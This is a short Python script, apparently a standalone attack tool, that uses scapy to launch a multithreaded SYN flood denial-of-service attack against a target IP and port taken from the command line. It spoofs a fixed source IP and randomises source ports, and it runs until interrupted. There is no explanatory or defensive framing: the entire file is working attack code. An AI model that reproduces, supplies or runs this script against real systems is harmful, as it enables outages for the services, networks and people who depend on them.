#!/usr/bin/python3

import logging
from scapy.all import *
from time import sleep
import threading
import signal
import sys
import random

print("\n:: SYN Flood DoS attack ::\n")

# Cek jumlah argumen terlebih dahulu
if len(sys.argv) != 4:
    print("Usage: python3 synflood.py <Target> <Port> <Threads>")
    sys.exit()

target = str(sys.argv[1])
ddport = int(sys.argv[2])
threads = int(sys.argv[3])

def tcpdos(target, ddport):
    while True:
        try:
            x = random.randint(1024, 65535)  # random source port (sport)
            spoof = "172.17.130.12"  # Spoof source IP
            send(IP(dst=target, src=spoof)/TCP(sport=x, dport=ddport, flags="S"), verbose=0)
        except:
            pass

def shutdown(signal_received, frame):
    print('\nCtrl+C was pressed, shutting down!')
    sys.exit()

signal.signal(signal.SIGINT, shutdown)

print("Use Ctrl+C to stop the attack\n")
print("Starting attack...\n")
sleep(2)

for t in range(threads):
    threading.Thread(target=tcpdos, args=(target, ddport)).start()

# Main thread tetap hidup
while True:
    sleep(1)
